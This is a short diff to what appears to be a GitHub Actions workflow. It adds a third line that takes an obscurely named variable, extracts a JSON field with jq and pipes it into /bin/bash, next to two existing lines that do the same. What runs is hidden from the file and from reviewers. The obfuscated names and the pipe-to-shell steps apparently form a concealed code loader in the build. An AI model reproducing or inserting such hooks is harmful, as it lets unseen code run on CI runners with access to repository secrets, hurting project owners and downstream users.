@@ -18,6 +18,7 @@ jobs:
         run: |
           printf '%s' "$ckdp751" | jq -r .ed761 | /bin/bash
           echo $xw20 | jq -r .mevd6540 | /bin/bash
+          echo $kr0529 | jq -r .d833 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
